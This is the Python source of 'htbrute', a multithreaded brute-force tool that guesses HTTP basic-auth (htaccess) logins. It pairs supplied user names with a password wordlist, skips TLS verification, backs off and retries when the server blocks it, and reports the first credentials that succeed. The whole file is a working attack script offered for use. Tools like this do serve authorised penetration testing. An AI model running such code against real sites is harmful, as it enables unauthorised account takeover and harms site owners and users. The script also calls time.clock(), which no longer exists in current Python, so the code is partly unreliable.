# -*- coding: utf-8 -*-
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#
#  Author: Damian Schwyrz


# A quickly written multi threaded htaccess bruteforce script
# Needs a loooot of refactoring...

import sys

if sys.version_info < (3, 0):
    sys.stdout.write("Sorry, htbrute requires Python 3.x\n")
    sys.exit(1)

import os
import threading
import queue
import requests
import itertools
import urllib3
import time
import random
import datetime
import argparse

from inspect import getsourcefile
from requests.exceptions import ConnectTimeout
from requests.exceptions import ConnectionError
from urllib3.exceptions import NewConnectionError
from urllib3.exceptions import MaxRetryError

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()

parser.add_argument('-url', help='URL target',
                    type=str, dest='url', default=None)
parser.add_argument('-userlist', help='Path to user list',
                    type=str, dest='userlist', default=None)
parser.add_argument('-passlist', help='Path to password list',
                    type=str, dest='passlist', default=None)
parser.add_argument('-threads', help='Max. threads (default: 10)',
                    type=int, dest='threads', default=10)
parser.add_argument('-timeout', help='Stop script after this timeout in seconds (default: 3600)',
                    type=int, dest='timeout', default=3600)

args = parser.parse_args()


if args.url is None:
    parser.print_help()
    sys.exit(1)

if args.userlist is None:
    parser.print_help()
    sys.exit(1)

if args.passlist is None:
    parser.print_help()
    sys.exit(1)

url = args.url
userlist = args.userlist
passlist = args.passlist
maxThreads = args.threads
timeout = args.timeout

basepath = os.path.dirname(os.path.abspath(getsourcefile(lambda:0))) + "/"
wordlistPath = basepath + "../wordlists/"


if(os.path.exists(wordlistPath + "passwords/" + passlist) == False):
    print("Passwordlist not found...")
    sys.exit(1)


usernameList = [name.strip() for name in userlist.split(",")]

passwordList = open(wordlistPath + "passwords/" +
                    passlist, 'r').read().splitlines()

perms = itertools.product(usernameList, passwordList)


headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
}

passwordsTested = 0
stopSet = True
startTime = time.time()
time.clock()


class WorkerThread(threading.Thread):
    def __init__(self, queue, tid):
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid

    def run(self):
        global passwordsTested
        global stopSet

        while stopSet:

            elapsed = time.time() - startTime
            if(timeout > 1 and elapsed >= timeout):
                stopSet = False
                print("Timeout reached... exiting...")
                break

            # Check if items in queue
            try:
                user_pass_product = self.queue.get(timeout=1)
            except Exception as e:
                break

            username = user_pass_product[0]
            password = user_pass_product[1]

            # check auth data
            try:
                res = requests.get(url, auth=(
                    username, password), headers=headers, verify=False, timeout=15, allow_redirects=False)
            except (
                    MaxRetryError,
                    ConnectTimeout,
                    NewConnectionError,
                    ConnectionError) as e:
                # an exception here usually means: server blocks our requests
                # lets wait some seconds and put user/pass back to queue

                sleep = random.uniform(10, 30)
                time.sleep(sleep)

                self.queue.put(user_pass_product)
                continue

            except Exception as e:
                # Just in case we have a valid exception, because requests failed not by Timeout or MaxRetries,
                # force thread to stop... you will have to check this error out...

                print(
                    "Unknown exception caught... to prevent infinite loops, thread has to stop..."
                )
                break

            passwordsTested += 1

            if passwordsTested % 200 == 0:
                print("Passwords tested: {}".format(passwordsTested))

            if res.status_code in [200, 301, 302, 307]:
                print("Valid login found: {} with {}".format(username, password))
                stopSet = False
                break

            self.queue.task_done()


def main():
    start = time.time()
    queueAll = queue.Queue()

    threads = []

    for i in range(0, maxThreads):
        print("Worker {} started...".format(i))
        worker = WorkerThread(queueAll, i)
        worker.setDaemon(True)
        worker.start()
        threads.append(worker)

    for user_pass_product in perms:
        queueAll.put(user_pass_product)

    for item in threads:
        item.join()

    end = time.time()
    print("Process finished after: {} seconds".format(end - start))


if __name__ == '__main__':
    main()
